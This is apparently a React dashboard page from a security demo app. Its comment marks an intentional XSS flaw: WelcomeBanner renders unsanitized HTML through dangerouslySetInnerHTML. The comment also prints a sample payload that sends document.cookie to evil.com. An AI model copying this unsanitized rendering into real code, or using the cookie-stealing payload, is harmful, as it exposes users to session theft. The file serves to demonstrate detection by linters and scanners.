import { useState } from 'react';
import { useAuth } from '../../../shared/context/AuthContext';
import MfaManager from '../components/MfaManager';

// [DEMO] VULNERABILIDAD INTENCIONAL — Cross-Site Scripting (XSS)
// Severidad: HIGH | CWE-79: Improper Neutralization of Input During Web Page Generation
// dangerouslySetInnerHTML inyecta HTML/JS sin sanitizar en el DOM.
// Un atacante que controle `welcomeMsg` puede ejecutar scripts arbitrarios:
//   <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
// Detectado por: ESLint (react/no-danger), SonarQube (S5732 — XSS hotspot)
function WelcomeBanner({ htmlContent }) {
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

export default function DashboardPage() {
  const { user } = useAuth();
  const welcomeMsg = `<b>Bienvenido</b>, ${user.email}`;

  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">Dashboard</h1>
      </div>

      <WelcomeBanner htmlContent={welcomeMsg} />

      <div className="dashboard-grid">
        <div className="card">
          <div className="card-title">Profile</div>
          <div className="info-row">
            <span className="info-key">Email</span>
            <span>{user.email}</span>
          </div>
          <div className="info-row">
            <span className="info-key">Department</span>
            <span className="dept-badge">{user.department}</span>
          </div>
          <div className="info-row">
            <span className="info-key">Roles</span>
            <span style={{ display: 'flex', gap: 6 }}>
              {user.roles.map((r) => (
                <span key={r} className={`role-badge role-${r}`}>{r}</span>
              ))}
            </span>
          </div>
          <div className="info-row">
            <span className="info-key">MFA</span>
            <span style={{ color: user.mfaEnabled ? 'var(--success)' : 'var(--text-muted)' }}>
              {user.mfaEnabled ? '✓ Enabled' : '✗ Disabled'}
            </span>
          </div>
        </div>

        <MfaManager />
      </div>

      <div className="card" style={{ marginTop: 20 }}>
        <div className="card-title">Architecture Overview</div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
          <div>
            <h4 style={{ marginBottom: 8, color: 'var(--primary)' }}>Authentication</h4>
            <ul style={{ paddingLeft: 16, color: 'var(--text-muted)', lineHeight: 2 }}>
              <li>Email + password (bcrypt)</li>
              <li>TOTP-based MFA (RFC 6238)</li>
              <li>JWT access tokens (8h)</li>
              <li>Short-lived MFA temp tokens (5m)</li>
            </ul>
          </div>
          <div>
            <h4 style={{ marginBottom: 8, color: 'var(--primary)' }}>API Architecture</h4>
            <ul style={{ paddingLeft: 16, color: 'var(--text-muted)', lineHeight: 2 }}>
              <li>Hexagonal (Ports &amp; Adapters)</li>
              <li>Domain entities + ABAC policy</li>
              <li>Use-case layer (application)</li>
              <li>SQLite driven adapter</li>
            </ul>
          </div>
          <div>
            <h4 style={{ marginBottom: 8, color: 'var(--info)' }}>RBAC</h4>
            <ul style={{ paddingLeft: 16, color: 'var(--text-muted)', lineHeight: 2 }}>
              <li>Roles: admin, editor, viewer</li>
              <li>Permissions per resource+action</li>
              <li>admin → full CRUD on all resources</li>
              <li>editor → read users/roles; CRU products</li>
            </ul>
          </div>
          <div>
            <h4 style={{ marginBottom: 8, color: 'var(--warning)' }}>ABAC (Products)</h4>
            <ul style={{ paddingLeft: 16, color: 'var(--text-muted)', lineHeight: 2 }}>
              <li>SELECT: dept match or admin</li>
              <li>INSERT: sales dept or admin</li>
              <li>UPDATE: owner or admin</li>
              <li>DELETE: owner+draft or admin</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
